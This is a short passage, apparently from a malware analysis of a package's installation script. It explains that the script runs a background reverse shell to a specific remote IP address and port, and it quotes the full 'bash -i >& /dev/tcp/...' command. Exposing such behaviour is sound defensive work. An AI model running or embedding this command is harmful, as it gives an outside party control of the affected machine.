Specifically, it runs 'bash -i >& /dev/tcp/13.250.135.170/2333 0>&1' in the background, which redirects an interactive bash shell's input and output to a remote server, effectively giving the remote server control over the machine during installation. This is a clear indication of malicious behavior designed to compromise the system."
